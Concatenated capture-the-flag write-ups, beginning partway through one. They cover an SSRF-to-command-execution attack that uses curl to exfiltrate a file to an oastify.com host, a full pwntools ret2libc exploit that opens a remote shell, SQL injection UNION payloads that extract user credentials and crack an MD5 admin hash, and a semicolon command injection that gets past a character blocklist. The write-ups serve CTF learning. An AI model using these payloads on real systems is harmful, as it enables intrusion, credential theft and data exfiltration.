Realizing hopes_and_dreams alone wasn’t enough, I try to find other internal endpoints that might allow command execution or file access. An exec endpoint seemed likely for running commands.

**Payload**:

`url=http://healthcheck/exec?cmd=curl+z9992jhxfhoaqrrutldhhjqriio9cz0o.oastify.com`

Burp Collaborator received a GET request to /test.

The exec endpoint executed my curl command and made an outbound request to my Collaborator URL. This confirmed I could run arbitrary commands and use them to interact with the system and exfiltrate data. My next task was to use this to read hopes_and_dreams.

I tried to read the file using shell substitution:

**Payload**:

`url=http://healthcheck/exec?cmd=curl+z9992jhxfhoaqrrutldhhjqriio9cz0o.oastify.com/$(cat+hopes_and_dreams)`

Burp Collaborator received a request to /cat, not the file contents.

Result: Only /cat was fetched.
Conclusion: Shell substitution wasn’t supported—commands weren’t run in a full shell.

I adjusted my approach to use curl data-binary option, which sends a file’s contents in the request body, avoiding the need for shell substitution.

**Payload**:

`url=http://healthcheck/exec?cmd=curl+-X+POST+--data-binary+@hopes_and_dreams+z9992jhxfhoaqrrutldhhjqriio9cz0o.oastify.com`

Burp Collaborator received a POST request with the contents of hopes_and_dreams in the body, revealing the flag!

![7d5028fa-631d-4a6e-86d2-df8852f34528](https://github.com/user-attachments/assets/8bf9e454-01f7-4785-8633-d48431b10765)

### Why It Worked?

- The SSRF allowed me to reach internal services like healthcheck/exec.
- The exec endpoint ran arbitrary commands.
- curl read the file and sent it in a POST request to my external server.
- This avoided shell substitution issues and allowed full exfiltration of the file.



### File: writeups/11-04-2025-umcsCTF/http-server.md

## **http-server (RE)**

![image](https://github.com/user-attachments/assets/d49c9b97-3daa-4e18-a6ef-8af4953c7a88)



### 1. Binary Analysis

I began by examining server.unknown using the strings command:

bash

`strings server.unknown`

```jsx
/lib64/ld-linux-x86-64.so.2
DU}99
puts
__stack_chk_fail
fread
exit
bind
htons
fopen
socket
fork
strlen
strstr
send
recv
malloc
__libc_start_main
listen
inet_aton
__cxa_finalize
malloc_usable_size
accept
fclose
memset
libc.so.6
GLIBC_2.4
GLIBC_2.34
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
PTE1
u+UH
[*]Socket Created!
[!]Failed! Cannot create Socket!
10.128.0.27
[*]IP Address and Socket Binded Successfully!
[!]Failed! IP Address and Socket did not Bind!
[*]Socket is currently Listening!
[!]Failed! Cannot listen to the Socket!
[*]Server Started....
[*]Waiting for client to connect.....
[*]Client Connected!
[!]Failed! Cannot accept client request
[*]Handling a Connection!
[!]Failed! No Bytes Received!
GET /goodshit/umcs_server HTTP/13.37
/flag
HTTP/1.1 404 Not Found
Content-Type: text/plain
Could not open the /flag file.
HTTP/1.1 200 OK
Content-Type: text/plain
HTTP/1.1 404 Not Found
Content-Type: text/plain
Not here buddy
9*3$"
GCC: (Ubuntu 13.3.0-6ubuntu2~24.04) 13.3.0
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.plt.sec
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment
                                            
```

This revealed:

- **Socket Operations**: Strings like [*]Socket Created! confirmed the server's network functionality.
- **HTTP Responses**: Formats like HTTP/1.1 404 Not Found and Content-Type: text/plain outlined response structures.
- **Path Behavior**:
    - /flag: Attempted to access a file, failing with a 404.
    - Other paths: Returned "Not here buddy."
- **Key Clue**: GET /goodshit/umcs_server HTTP/13.37, an unusual request with a non-standard HTTP version (13.37).
- **File Functions**: fopen and fread suggested file-based responses in some cases.

### 2. Initial Server Probing

I tested the server with curl to observe its behavior with standard HTTP requests.

### Request to /flag:

```python
curl http://34.133.69.112:8080/flag
```

**Response**:

```python
Not here buddy
```

This differed from the expected "Could not open the /flag file." message, suggesting a possible server tweak or additional logic.

### Request to /goodshit/umcs_server:

```python
curl http://34.133.69.112:8080/goodshit/umcs_server
```

**Response**:

```python
Not here buddy
```

Both requests, using HTTP/1.1, yielded generic 404s, confirming that standard requests wouldn’t suffice.

### 3. Crafting a Custom Request

The HTTP/13.37 clue implied the server required this specific version. Since curl can’t handle arbitrary HTTP versions, I switched to netcat to manually craft the request:

```python
echo -e "GET /goodshit/umcs_server HTTP/13.37\r\nHost: 34.133.69.112\r\n\r\n" | nc 34.133.69.112 8080
```

- **Command Breakdown**:
    - echo -e: Interprets \r\n for proper HTTP line endings.
    - GET /goodshit/umcs_server HTTP/13.37: Specifies the method, path, and version.
    - Host: 34.133.69.112: Required HTTP header.
    - nc 34.133.69.112 8080: Sends the request to the server.

**Response**:

```python
HTTP/1.1 200 OK
Content-Type: text/plain
umcs{http_server_a058712ff1da79c9bbf211907c65a5cd}
```



### File: writeups/11-04-2025-umcsCTF/liveleak.md

### **liveleak**

![image 2](https://github.com/user-attachments/assets/dfdfa5e8-69f2-4483-b3c2-0f3397fee2ec)


**Goal**: Get the flag from /flag on the server at 34.133.69.112:10007 using the provided binary chall.

---

## Find Offset

**script**

```python
from pwn import *

# Generate a 100-byte cyclic pattern
pattern = cyclic(100)
with open("pattern.txt", "wb") as f:
    f.write(pattern)

# Run the binary with the pattern
p = process(["./ld-2.35.so", "./chall"])
p.sendline(pattern)
p.wait()

# Check the crash to find the offset
core = p.corefile
offset = cyclic_find(core.read(core.rsp, 8))
print(f"Offset: {offset}")
                                                                            
```

**output**

```python
[+] Starting local process './ld-2.35.so': pid 10845
[*] Process './ld-2.35.so' stopped with exit code -11 (SIGSEGV) (pid 10845)
[+] Parsing corefile...: Done
[*] '/home/kali/Downloads/core.10845'
    Arch:      amd64-64-little
    RIP:       0x401291
    RSP:       0x7ffffcb64e58
    Exe:       '/home/kali/Downloads/ld-2.35.so' (0x7fd170151000)
    Fault:     0x6161617461616173
[!] cyclic_find() expected a 4-byte subsequence, you gave b'saaataaa'
    Unless you specified cyclic(..., n=8), you probably just want the first 4 bytes.
    Truncating the data at 4 bytes.  Specify cyclic_find(..., n=8) to override this.
Offset: 72
                                          
```

## Plan in 3 Steps

1. **Leak an Address**: Trick the program into printing a memory address from libc (a library it uses).
2. **Find Key Addresses**: Use the leaked address to locate system (runs commands) and /bin/sh (a shell).
3. **Get a Shell**: Run system("/bin/sh") to open a shell and grab the flag.

---

## Step-by-Step Exploit

### 1. Leak the Address

- Send a payload to make the program print the address of puts (a function in libc).
- **Payload**:
    - 72 bytes of junk (As).
    - Special addresses to call puts and return to main.

```python
payload = b"A" * 72
payload += b"\xbd\x12\x40\x00\x00\x00\x00\x00"  *# pop rdi; ret*
payload += b"\x18\x40\x40\x00\x00\x00\x00\x00"  *# puts@GOT*
payload += b"\x90\x10\x40\x00\x00\x00\x00\x00"  *# puts@PLT*
payload += b"\x92\x12\x40\x00\x00\x00\x00\x00"  *# main*
```

- Result: You get an address like 0x7f1234567e50.

### 2. Calculate Addresses

- Subtract 0x80e50 (the offset of puts in libc) from the leaked address to find the libc base.
- Add offsets to find:
    - system: base + 0x50d70
    - /bin/sh: base + 0x1d8678

### 3. Get the Shell

- Send a second payload to call system("/bin/sh").
- **Payload**:
    - 72 bytes of junk.
    - Align the stack, then call system with /bin/sh.

```python
payload = b"A" * 72
payload += b"\x1a\x10\x40\x00\x00\x00\x00\x00"  *# ret*
payload += b"\xbd\x12\x40\x00\x00\x00\x00\x00"  *# pop rdi; ret*
payload += p64(bin_sh_addr)  *# /bin/sh address*
payload += p64(system_addr)  *# system address*
```

---

## Full Exploit Code

```python
from pwn import *

# Set up the context
context.binary = "/home/kali/Downloads/chall"
context.log_level = "info"

# Connect to the remote server
p = remote("34.133.69.112", 10007)

# Binary addresses (these remain the same as local)
pop_rdi = 0x4012bd       # Gadget: pop rdi; ret
puts_plt = 0x401090      # PLT address of puts
puts_got = 0x404018      # GOT address of puts
main_addr = 0x401292     # Address to return to main after leak
ret_gadget = 0x40101a    # Simple ret gadget for stack alignment

# Step 1: Leak the puts address from libc
payload = b"A" * 72      # Padding to overwrite return address
payload += p64(pop_rdi)  # pop rdi; ret
payload += p64(puts_got) # Argument: address of puts in GOT
payload += p64(puts_plt) # Call puts to leak the address
payload += p64(main_addr)# Return to main for second input

info("Sending payload to leak libc address")
p.recvuntil(b"Enter your input: ")
p.sendline(payload)

# Receive and parse the leaked address
p.recvline()  # Discard input echo or newline
leak = u64(p.recvline().strip().ljust(8, b"\x00"))
info(f"Leaked puts address: {hex(leak)}")

# Step 2: Calculate libc base and function addresses
puts_offset = 0x80e50    # Offset of puts in libc (same as local)
libc_base = leak - puts_offset
info(f"Libc base: {hex(libc_base)}")

system_offset = 0x50d70  # Offset of system in libc
bin_sh_offset = 0x1d8678 # Offset of /bin/sh string in libc
system_addr = libc_base + system_offset
bin_sh_addr = libc_base + bin_sh_offset
info(f"System address: {hex(system_addr)}")
info(f'/bin/sh address: {hex(bin_sh_addr)}')

# Step 3: Craft payload to call system("/bin/sh") with stack alignment
payload = b"A" * 72      # Padding
payload += p64(ret_gadget)# ret gadget to align stack
payload += p64(pop_rdi)  # pop rdi; ret
payload += p64(bin_sh_addr)# Set rdi to "/bin/sh" address
payload += p64(system_addr)# Call system("/bin/sh")

info("Sending payload to get shell")
p.recvuntil(b"Enter your input: ")
p.sendline(payload)

# Switch to interactive mode to interact with the shell
p.interactive()
```

**output**

```python
*] '/home/kali/Downloads/chall'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x3ff000)
    RUNPATH:    b'.'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Opening connection to 34.133.69.112 on port 10007: Done
[*] Sending payload to leak libc address
[*] Leaked puts address: 0x73b5c73f6e50
[*] Libc base: 0x73b5c7376000
[*] System address: 0x73b5c73c6d70
[*] /bin/sh address: 0x73b5c754e678
[*] Sending payload to get shell
[*] Switching to interactive mode

$ whoami
pwnuser
$ cat /flag
umcs{GOT_PLT_8f925fb19309045dac4db4572435441d}

```

---

Get the Flag

- In the shell, type: cat /flag
- Example flag: umcs{GOT_PLT_8f925fb19309045dac4db4572435441d}



### File: writeups/2025-02-28-synk-ctf/Coding Mountains.md

## Coding Mountains

```
Author: @Soups71I
like mountains and I like coding, so I made this game. I hope you also 
like both of those things, or else you probably won't have a ton of 
fun...  **Press the Start button in the top-right to begin this challenge.**
```

Kali Linux:

![image](https://github.com/user-attachments/assets/f319665d-2ab2-4168-96cd-f3c0f42e3025)


- The server then asks a series of mountain-related questions.
- Each question follows this pattern:
    
    ```
    What is the height and first ascent year of <Mountain Name>:
    ```
    
- The player must respond with the correct height and first ascent year in a comma-separated format, like this:
    
    ```
    height,year
    ```
    

Python script used to automate the challenge:

```python
import json
import socket
import re
import time

# Load mountain data from JSON file
with open("mountains.json", "r") as file:
    mountains = json.load(file)

# Convert mountains data into a dictionary for quick lookup
mountain_dict = {m["name"].lower(): (m["height"].replace(",", ""), m["first"]) for m in mountains}

# Connect to the challenge server
HOST = "challenge.ctf.games"
PORT = 30173

# Establish a socket connection
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    time.sleep(1)  # Give time for server to respond

    # Read the welcome message
    data = s.recv(4096).decode()
    print(data)

    # Send "y" to start the quiz
    s.sendall(b"y\n")
    time.sleep(1)  # Wait for the server to process

    while True:
        # Receive the question
        data = s.recv(4096).decode()
        print(data)

        # Extract mountain name using regex
        match = re.search(r"What is the height and first ascent year of (.*?):", data)
        if not match:
            break  # If no more questions, exit loop

        mountain_name = match.group(1).strip().lower()

        # Look up the mountain data
        if mountain_name in mountain_dict:
            height, first_ascent = mountain_dict[mountain_name]
            answer = f"{height},{first_ascent}"
        else:
            print(f"Mountain '{mountain_name}' not found!")
            answer = "none,none"

        # Send the answer
        s.sendall(answer.encode() + b"\n")
        time.sleep(1)  # Wait for server response

    # Final response from the server
    final_response = s.recv(4096).decode()
    print(final_response)
```

After 50 questions, you will get the flag:

![image 1](https://github.com/user-attachments/assets/3aa52f63-452f-4f73-a9cd-dedd33390a55)



### File: writeups/2025-02-28-synk-ctf/Weblog.md

## Weblog

Author: @HuskyHacks

Web-LOG? We-BLOG? Webel-OGG? No idea how this one is pronounced. It's on the web, it's a log, it's a web-log, it's a blog. Just roll with it.


![image 2](https://github.com/user-attachments/assets/306a5aae-1f5e-434d-92ca-078c2c1dab46)


![image 3](https://github.com/user-attachments/assets/80872514-903a-41b9-a191-247e80f8857d)

## **SQL Injection in `/search`**

![image 4](https://github.com/user-attachments/assets/6ac31afa-1360-4a3c-8282-fdc9e09e286f)


### **Identifying SQL Injection**

In the source code (`search.py`), the **search feature** was vulnerable to SQL injection:

```python
query = request.args.get("q", "")
raw_query = text(f"SELECT * FROM blog_posts WHERE title LIKE '%{query}%'")
posts = db.session.execute(raw_query).fetchall()
```

 **Vulnerability:**

- User input (`query`) is **directly concatenated** into the SQL query.
- No **parameterized queries** are used, making it vulnerable to SQL injection.

### **Exploiting SQL Injection**

I tested for SQL injection by searching:

```
' OR '1'='1
```

This payload modified the query to:

```sql
SELECT * FROM blog_posts WHERE title LIKE '%' OR '1'='1'
```

**Result:** It **retrieved all blog posts**, confirming SQL injection.

---

## **Extracting User Credentials**

After confirming SQL injection, I attempted to **extract user credentials** from the `users` table.

### **Finding the Correct Column Count**

When running:

```
' UNION SELECT username, password FROM users --
```

I got:

![image 5](https://github.com/user-attachments/assets/9b82a4ee-fdc3-4ea2-bd94-1562ed9fc3bb)


**Cause:** The number of columns in `blog_posts` and `users` did not match.

I used an **ORDER BY trick** to determine the correct column count:

```sql
' ORDER BY 1 --
' ORDER BY 2 --
...
' ORDER BY 6 --  (This caused an error)
```

**Conclusion:** The `blog_posts` table had **5 columns**.

### **Analyzing the Column Data Types**

I examined the `blog_posts` table structure:

```sql
sql
CopyEdit
CREATE TABLE blog_posts (
    id INT AUTO_INCREMENT PRIMARY KEY,
    title VARCHAR(255),
    content TEXT,
    author VARCHAR(255),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
```

From this, I determined the **expected data types**:

1. `id` (Integer - INT)
2. `title` (String - VARCHAR)
3. `content` (Text - TEXT)
4. `author` (String - VARCHAR)
5. `created_at` (Timestamp - TIMESTAMP)

---

### **SQL Injection**

I adjusted my payload to **match the expected data types**:

```sql
' UNION SELECT 1, "test", "test", "test", NOW() --
```

📌 **Breakdown of Fix:**

- `1` → **Integer (id)**
- `"test"` → **String (title)**
- `"test"` → **Text (content)**
- `"test"` → **String (author)**
- `NOW()` → **Timestamp (created_at)**

**This payload executed successfully**, confirming the correct column count and data types.


![image 6](https://github.com/user-attachments/assets/0f8c3dd9-e3c9-4bf1-85af-e119b596ee28)

---

### **Extracting User Credentials**

Now that I had a **working UNION SELECT payload**, I refined it to extract user credentials:

```sql
' UNION SELECT 1, username, password, email, "2025-01-01 00:00:00" FROM users -- 
```

**Result:** This payload successfully retrieved **admin credentials** from the `users` table.

![image 7](https://github.com/user-attachments/assets/5c1bee3a-3745-4368-bfdf-3bf2594e6b1f)

![image 8](https://github.com/user-attachments/assets/4212ac3e-67d1-4cee-a857-d7f6fee3ed88)

---

**Step 4: Cracking the Admin Password**

One of the extracted users was:

```
admin - c1b8b03c5a1b6d4dcec9a852f85cac59
```

This **looked like an MD5 hash**, so I tried **cracking it**

```
c1b8b03c5a1b6d4dcec9a852f85cac59 → no1trust
```

**Admin Credentials:**

```
Username: admin
Password: no1trust
```

I then **logged in as the admin**.

---

## **Exploiting Command Injection in Admin Panel**

![image 9](https://github.com/user-attachments/assets/4cd378d9-c6aa-4cd0-8755-84415b93c730)


After logging in, I accessed the **Admin Panel (`/admin`)**.

The `admin.py` file contained:

```python
DEFAULT_COMMAND = "echo 'Rebuilding database...' && /entrypoint.sh"

DISALLOWED_CHARS = r"[&|><$\\]"
...
if not command.startswith(DEFAULT_COMMAND):
    error_message = "Invalid command: does not start with the default operation."
elif re.search(DISALLOWED_CHARS, command[len(DEFAULT_COMMAND):]):
    error_message = "Invalid command: contains disallowed characters."
```

**Vulnerability:**

- The app **checks if commands start with** `"echo 'Rebuilding database...' && /entrypoint.sh"`.
- It **blocks** certain characters: `& | > < $ \`, but **`;` (command separator) is not blocked**.

### **Command Injection Payload**

To execute system commands, I crafted

```bash
echo 'Rebuilding database...' && /entrypoint.sh; ls -la
```

**Result:** It listed all files, revealing `flag.txt`!

---

## **Capturing the Flag**

Since I now had command execution, I used:

```bash
echo 'Rebuilding database...' && /entrypoint.sh; cat flag.txt
```

**Final Flag:**

![5bcf3558-1f72-43bd-84eb-71de9606aa09](https://github.com/user-attachments/assets/f0cf27a3-abc8-46c3-a055-a9d0804028d6)

flag{b06fbe98752ab13d0fb8414fb55940f3}



### File: writeups/2025-02-28-synk-ctf/Zero Ex Six One.md

## **Zero Ex Six One**

Difficulty: easy
Category: warmup

```bash
Author: @HuskyHacks
I'm XORta out of ideas for how to get the flag. Does this look like anything to you?
```

0x070x0d0x000x060x1a0x020x540x510x050x590x530x020x510x000x530x540x070x520x040x570x550x550x050x510x560x510x530x030x550x500x050x030x050x510x590x540x000x1c

Clue

XOR encryption
Key: 0x61

flag{c50d82c0a25f3e644d0702b41dbd085a}

